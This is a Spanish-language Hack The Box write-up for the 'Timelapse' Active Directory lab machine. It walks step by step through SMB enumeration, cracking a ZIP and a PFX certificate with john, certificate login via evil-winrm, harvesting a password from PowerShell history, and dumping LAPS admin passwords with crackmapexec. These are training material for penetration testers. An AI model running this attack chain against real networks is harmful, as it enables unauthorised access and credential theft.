---
title: Timelapse HTB Write-up
categories: [Write up, Hack The Box]
tags: [Enumeration, Active Directory, ZIP cracking, PFX cracking, Openssl, Private key, LAPS, Windows, Easy]
pin: false
math: true
mermaid: true
---

<img src="/imagenes/timelapse/Timelapse_banner.png"  width="550" height="250">


## Resumen

Saludos, en esta oportunidad vamos a resolver la máquina de **Hack The Box** llamada **Timelapse**, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:

*   **Enumeración del sistema, en este caso es de directorio activo (smbmap, smbclient, crackmapexec).**
*   **Cracking de archivos ZIP protegidos.**
*   **Cracking de archivos .PFX**
*   **Extracción de clave privada y certificado a partir de archivo .PFX con openssl.**
*   **Abusando de LAPS para obtener contraseñas utilizando crackmapexec.**


## Reconocimiento y Enumeración

En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando `ping`:

```
ping -c 1 10.10.11.152
PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.
64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=545 ms
```
Se observa que existe una correcta conexión con la máquina.

Para realizar un reconocimiento activo se utilizará la herramienta `nmap`, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro `-sS` el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):

```
sudo nmap -p- -sS -open -min-rate 5000 -Pn 10.10.11.152 -oG Ports
```
Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima: 
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49692/tcp open  unknown
49704/tcp open  unknown
```
Los puertos expuestos de la máquina nos hacen pensar que se trata de un directorio activo, sin embargo, realizamos un escaneo de los servicios expuestos utilizando `nmap`:

```
sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692,49704 10.10.11.152
```

Como resultado del escaneo tenemos:

```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-02-08 14:02:30Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_ssl-date: 2023-02-08T14:04:02+00:00; +7h59m59s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49692/tcp open  msrpc             Microsoft Windows RPC
49704/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-08T14:03:25
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
```

Efectivamente, estamos frente a un directorio activo. En primer lugar, se observa el puerto `445` abierto, el cual corresponde al servicio `smb`, por lo tanto, intentaremos realizar una enumeración del equipo y también si es posible de usuarios o recursos, para ello usaremos diferentes herramientas, la primera es `crackmapexec`:

```
crackmapexec smb 10.10.11.152

SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
```
Se puede observar que es un DC y que el dominio es **timelapse.htb**, por lo tanto, abrimos el /etc/hosts e ingresamos dicho nombre de dominio:

```
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.152    timelapse.htb
```
Para de esta manera tener conectividad, para comprobarlo utilizamos `ping`:

```
ping -c 1 timelapse.htb

PING timelapse.htb (10.10.11.152) 56(84) bytes of data.
64 bytes from timelapse.htb (10.10.11.152): icmp_seq=1 ttl=127 time=641 ms
```

Luego de comprobar lo anterior, probamos si se pueden listar archivos compartidos en la red, para ello utilizamos `smbmap` utilizando **Guest sesion**:

```
smbmap -H 10.10.11.152 -u'null'

[+] Guest session       IP: 10.10.11.152:445    Name: timelapse.htb                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 

```
Observamos que tenemos capacidad de lectura para el recurso **Shares**, asi que nos conectaremos utilizando `smbclient`:

```
smbclient //10.10.11.152/shares -N

Try "help" to get a list of possible commands.
smb: \> 
```
Ingresamos correctamente, ahora buscaremos que recursos compartidos existen:


```
smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021
```

Encontramos un archivo dentro de la carpeta Dev llamado **winrm_backup.zip**, el cual se ve prometedor, por lo tanto, lo pasamos a nuestro equipo:

```
smb: \Dev\> get winrm_backup.zip

getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
```
Si seguimos buscando en los directorios encontramos lo siguiente:

```
smb: \HelpDesk\> dir

  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021
```

Encontramos diversos archivos de **LAPS**, el cual corresponde a una solución de Microsoft que permite administrar las contraseñas de cuentas de administrador local para equipos unidos a un dominio. Sin embargo, no podemos realizar nada con estos archivos, pero vale la pena saber que están implementados.


## Explotación

Volviendo con el **winrm_backup.zip** tenemos:

```
unzip winrm_backup.zip

Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
```

Pide una contraseña, la cual no tenemos, por lo tanto, vamos a intentar crackear dicha contraseña utilizando `zip2john`, el cual extraer un hash que podemos intentar crackear:

```
ip2john winrm_backup.zip > hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
```

Utilizando el mismo `john` intentaremos romper este hash:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2023-02-08 01:34) 3.030g/s 10525Kp/s 10525Kc/s 10525KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Pudimos encontrar la contraseña, la cual corresponde a **supremelegacy** asi que la utilizaremos para abrir el .zip:

```
unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
```

Tenemos un archivo .pfx, el cual corresponde a un archivo de seguridad con clave privada de un certificado, si buscamos como abrir este tipo de archivo encontramos esta [web](https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/), la cual nos dice como extraer una llave privada y un certificado a partir del archivo .pfx asi que vamos a intentarlo:


```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey -nodes
Enter Import Password:
```

Pero nos pide una contraseña, la cual no tenemos.

Utilizando la herramienta `pfx2john` podemos obtener la contraseña de este archivo .pfx:

```
pfx2john legacyy_dev_auth.pfx > hashpfx
```

Esto nos extrae un hash que podemos intentar romper, para esto utilizaremos `john`:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashpfx
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:15 DONE (2023-02-08 01:53) 0.01326g/s 42860p/s 42860c/s 42860C/s thuglife06..thug211
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Tenemos la contraseña, la cual es 'thuglegacy', asi que utilizamos esta contraseña para extraer la clave privada y el certificado:

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey -nodes
Enter Import Password:
```
```
ls

legacyy_dev_auth.pfx  privkey
```

Tenemos la llave privada, ahora iremos por el certificado:

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem

Enter Import Password:
```

```
ls
certificate.pem  legacyy_dev_auth.pfx  privkey
```

Tenemos en nuestro poder la clave privada y el certificado, esto nos sirve pues al tenerlos podemos autenticarnos en la máquina utilizando `evil-winrm`:

```
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate

```

Haciendo uso de estas flags podemos entrar, sin embargo, hay un detalle, dentro de la captura de nmap podemos observar que el puerto 5986 está abierto pero por ssl:


```
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
Por lo tanto, tenemos que utilizar la flag **-S** para realizar la conexión por ssl:

```
evil-winrm -i 10.10.11.152 -c certificate.pem -k privkey -S

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

Hemos ingresado correctamente a la máquina, ahora buscamos la flag del usuario en su directorio personal:

```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
f0077300e68b7b8434828
```
¡Bien! ahora solo falta encontrar la forma de convertirnos en administradores.


## Escalada de privilegios

Ahora que estamos en la máquina buscaremos si tenemos algún privilegio especial:
```
C:\Users\legacyy> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
Sin embargo, no tenemos. Veremos los grupos:

```
*Evil-WinRM* PS C:\Users\legacyy> net user legacyy
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 11:17:10 AM
Password expires             Never
Password changeable          10/24/2021 11:17:10 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/8/2023 7:02:50 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
```

Pero no vamos nada interesante además de **Remote Management use**, ahora vamos a enumerar los usuarios del sistema:

```
:\Users\legacyy> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
```

Luego de revisar todos los usuarios, uno en particular pertenece a un grupo especial:

```
*Evil-WinRM* PS C:\Users\legacyy> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

Pertenece al grupo **LAPS_Readers**, por lo tanto, necesitamos convertirnos en ese usuario.

Buscando vias potenciales, antes de utilizar herramientas como winPEAS y BloodHound, veremos si existe información en el historial de **powershell**:
```
*Evil-WinRM* PS C:\Users\legacyy>  type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
Si existe información, podemos observar una clave y nombre de usuario, **svc_deploy**. Haciendo uso de `crackmapexec` verificamos si las credenciales son correctas:

```
crackmapexec smb 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
```
La contraseña es correcta, por lo tanto, utilizaremos el propio `crackmapexec` para leer las contraseñas de LAPS, debido a que el usuario pertenece al grupo **LAPS_Readers**:

```
crackmapexec ldap 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' –kdcHost 10.10.11.152 -M laps

SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.152    389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
LAPS        10.10.11.152    389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.11.152    389    DC01             Computer: DC01$                Password: k./#7,%N)Jz(s;RI)7JPOHDS
```
Observamos que tenemos la contraseña, esta corresponde a la de administrador de dominio, pues LAPS sirve para eso, por lo tanto, vamos a verificar con `crackmapexec` si es correcto:
```
crackmapexec smb 10.10.11.152 -u 'Administrator' -p 'k./#7,%N)Jz(s;RI)7JPOHDS'

SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\Administrator:k./#7,%N)Jz(s;RI)7JPOHDS (Pwn3d!)
```
Si, asi que utilizando `evil-winrm` entramos:

```
evil-winrm -i 10.10.11.152 -u 'Administrator' -p 'k./#7,%N)Jz(s;RI)7JPOHDS' -S

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Ahora solo debemos encontrar la flag de administrador, sin embargo, no se encuentra en su directorio, pero existe un usuario que también es administrador:
```
C:\Users> net user TRX
User name                    TRX
Full Name                    TRX
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2022 5:43:45 PM
Password expires             Never
Password changeable          2/24/2022 5:43:45 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/8/2023 5:42:02 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

Por lo que iremos a su directorio a buscar:

```
*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
fd8604a9df69fc948356
```

!Listo! 

Hemos vulnerado completamente la máquina hasta ser administradores.

Nos vemos, hasta la próxima.
